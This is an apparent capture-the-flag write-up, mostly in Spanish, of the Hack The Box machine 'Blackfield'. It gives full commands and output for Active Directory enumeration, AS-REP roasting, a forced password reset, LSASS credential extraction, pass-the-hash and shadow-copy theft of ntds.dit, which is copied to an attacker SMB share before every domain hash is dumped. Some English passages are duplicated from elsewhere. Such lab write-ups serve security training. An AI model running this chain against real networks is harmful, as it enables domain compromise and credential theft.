---
layout: post
title: BlackField
date: 2022-12-31
description: # You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: # /Blackfield-htb/Blackfield_thumbnail.jpg # Add image post (optional)
fig-caption: # Add figcaption (optional)
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Blackfield-htb/Blackfield_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración del SMB

* Enumeración de Kerberos

* ASRepRoast Attack

* Enumeración con Bloodhound

* Abuso del Privilegio ForceChangePassword

* Volcado de Lsass

* Abuso del Grupo SeBackupPrivilege

* Dumpeo de hashes NT

* PassTheHash

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
root@kali nmap -p- --min-rate 5000 -n -Pn -sS -vvv 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.073s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 33.26 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
root@kali# nmap -p53,88,135,389,445,593,3268,5985 -sCV 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.15s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-11 02:33:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/7%Time=5EDD4080%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h02m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-11T02:35:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.46 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.192
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-11 15:46 EDT
Nmap scan report for 10.10.10.192
Host is up (0.015s latency).
Not shown: 65533 open|filtered ports
PORT    STATE SERVICE
53/udp  open  domain
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
Based on that combination, it looks like a Windows Domain controller. No real hint on the OS at this point. There is a domain name from the LDAP output, blackfield.local.

DNS - TCP/UDP 53
Any time I see DNS on TCP it’s worth trying a zone transfer. I can query for blackfield.local:

dig @10.10.10.192 blackfield.local

; <<>> DiG 9.16.2-Debian <<>> @10.10.10.192 blackfield.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59954
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;blackfield.local.              IN      A

;; ANSWER SECTION:
blackfield.local.       600     IN      A       10.10.10.192

;; Query time: 36 msec
;; SERVER: 10.10.10.192#53(10.10.10.192)
;; WHEN: Sun Jun 07 20:07:29 EDT 2020
;; MSG SIZE  rcvd: 61
The zone transfer would list all the known subdomains, but it fails:

dig axfr @10.10.10.192 blackfield.local

; <<>> DiG 9.16.2-Debian <<>> axfr @10.10.10.192 blackfield.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
LDAP - TCP 389 / 3268
I’ll use ldapsearch to see what information I can pull. Even though I have a domain name already, I’ll ask LDAP for the base naming contexts:
```

### Enumeración del ldap (Puerto 389)
```null
ldapsearch -h 10.10.10.192 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

### Enumeración del DNS (Puerto 53)

Dado que por ldap en base a los namingcontexts se ha leakeado un dominio, se puede efectuar un ataque de transferencia en el que se pueden obtener subdominios que ofrezcan otros servicios

```null
dig @10.10.10.192 blackfield.local

; <<>> DiG 9.16.2-Debian <<>> @10.10.10.192 blackfield.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59954
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;blackfield.local.              IN      A

;; ANSWER SECTION:
blackfield.local.       600     IN      A       10.10.10.192

;; Query time: 36 msec
;; SERVER: 10.10.10.192#53(10.10.10.192)
;; WHEN: Sun Jun 07 20:07:29 EDT 2020
;; MSG SIZE  rcvd: 61
```

```null
dig axfr @10.10.10.192 blackfield.local

; <<>> DiG 9.16.2-Debian <<>> axfr @10.10.10.192 blackfield.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### Enumeración del SMB (Puerto 445)

#### Crackmapexec

```null
crackmapexec smb 10.10.10.192
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```
#### Smbmap

```null
smbmap -H 10.10.10.192 -u null

[+] Guest session       IP: 10.10.10.192:445    Name: unknown

Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
forensic                                                NO ACCESS       Forensic / Audit share.
IPC$                                                    READ ONLY       Remote IPC
NETLOGON                                                NO ACCESS       Logon server share 
profiles$                                               READ ONLY
SYSVOL                                                  NO ACCESS       Logon server share 
```

Enumerando ficheros del recurso compartido a nivel de red *profiles$*

```null
root@kali# smbclient -N //10.10.10.192/profiles$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
```

Se pueden observar distintos usuarios, así que crearé una montura en el equipo para trabajar más comódamente y crear un diccionario


```null
root@kali# mount -t cifs //10.10.10.192/profiles$ /mnt
Password for root@//10.10.10.192/profiles$: 
```

Una vez creado el diccionario con todos los usuarios, se puede probar un ASP-RepRoast Attack que consiste en comunicarse al Domain Controler por Kerberos para tratar de que alguno de estos usuarios no requiera autenticación previa del mismo, lo que permitirá obtener un TGT que se puede intentar crackear por fuerza bruta, ya que no aplica para PassTheHash

```null
root@kali# GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 
$krb5asrep$23$support@BLACKFIELD.LOCAL:83f252224f04becb3108d7234f0fcd94$0f355b4ad7b813039520ec6ed1f451575c79c313a3779707b24fd8824aa74d9d4fda352599ad767167ade44f4f6a67b6e0d54016e26502ab618b0d7791a40ffc60480703a1cd6bd5ae68078ab9589a91284966a54fc6134ae52f8efc41164386e4e251b41aa09f46616d53c103216d3c3e0560c5e822937ad3b4f61527c9d4fb63664abd2888d2c379340baf682a38491978c9e63d151fc54725e969df94a34f996849c439ff6953a5c9747774d6878ff5555b8c6af1415ec3c141206c460f2d4949456f429d766072d0d348b30d642e521b14cf9cef4bc8d01da69bd3995b4019ee5bbbb024346ea7786474980ec6b1bb9d13c0
```
Almacenaré el hash en un archivo para tratar de crackearlo

```null
john -w:$(locate rockyou.txt) hash
```

#### Validación de credenciales por crackmapexec

```null
root@kali# crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
```

En caso de que el usuario pertenezca al grupo *Remote Management Users* me podré conectar directamente usando evil-winrm

```null
root@kali# crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD\support:#00^BlackKnight "Failed to authenticate the user support with ntlm"
```

#### Enumeración con BloodHound-python

```null
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c All
```

Esto dumpeará datos del domain controller que me permitirán encontrar formas de elevar privilegios

Para ello, hay que abrir BloodHound y subir los datos

```null
sudo neo4j console
bloodhound &>/dev/null & disown
```
Se puede observar el siguiente privilegio:

![]({{site.baseurl}}/assets/img/Blackfield-htb/blackfield_bh1.jpg)

#### Abusando de ForceChangePassword

A través, del servicio *RPC*, se puede modificar la contraseña del usuario *audit2020*

```null
rpcclient -U blackfield/support 10.10.10.192
rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
```

Ahora, al tener unas nuevas credenciales válidas, puedo enumerar de nuevo los recuersos compartidos a nivel de red por *SMB*

Se puede observar un backup del lsass, así que procedo a descargarlo

```null
smbclient.py audit2020:'H@CKTHEB0X#'@10.10.10.192
use forensic
cd memory_analysis
ls
get lsass.zip
exit
```

A través de pypykatz, se puede tratar de desencriptar el *lsass*

```null
pypykatz lsa minidump lsass.DMP

INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
[...]
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
[...]
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
```

Las credenciales del Usuario Administrador no son válidas, pero las de svc_backup sí, por lo que me puedo conectar a la máquina por win-rm

```null
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

Enumerando los grupos a los que pertenece este usuario, se puede observar que pertenece a *Backup Operators*, por lo que es posible dumpearse el ntds y el system y hacer PassTheHash

```null
Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Para obtener el system, basta con hacer una copia desde el registro

```null
reg save HKLM\SYSTEM system.bak
```

Para el ntds, hay que utilizar robocopy y diskshadow

Hay que crear un fichero con el siguiente contenido, que se encargará de crear una unidad lógica en la que sí sea posible copiar el ntds, ya que desde C: no se puede.

```null
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
```

Este mismo fichero se procesa con diskshadow

```null
*Evil-WinRM* PS C:\temp> diskshadow /s fichero.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/1/2020 1:30:41 AM

-> set context persistent nowriters
-> add volume c: alias pwn
-> create
Alias pwn for shadow ID {4aa7fb85-c839-4e4e-98e9-a949bfb83735} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {bf423ef5-badb-4ae0-aa45-53ae68e595f7} set as environment variable.

Querying all shadow copies with the shadow copy set ID {bf423ef5-badb-4ae0-aa45-53ae68e595f7}

	* Shadow copy ID = {4aa7fb85-c839-4e4e-98e9-a949bfb83735}		%pwn%
		- Shadow copy set: {bf423ef5-badb-4ae0-aa45-53ae68e595f7}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 9/1/2020 1:30:44 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %pwn% z:
-> %pwn% = {4aa7fb85-c839-4e4e-98e9-a949bfb83735}
The shadow copy was successfully exposed as z:\.
->
```

Con robocopy, puedo copiar el ntds desde la unidad lógica que acabo de crear

```null
robocopy /b z:\windows\ntds . ntds.bak
```

Desde la máquina linux, creo un recurso compartido a nivel de red, para transferirme el ntds y el system y procesarlo de forma local

```null
impacket-smbserver shared $(pwd) -smb2support
```

Desde el Windows, copio los archivos a mi máquina

```null
copy system.bak x.x.x.x\shared\system
copy ntds.bak x.x.x.x\shared\ntds
```

Desde kali, dumpeo todos los hashes NT de los usuarios del directorio activo

```null
impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```
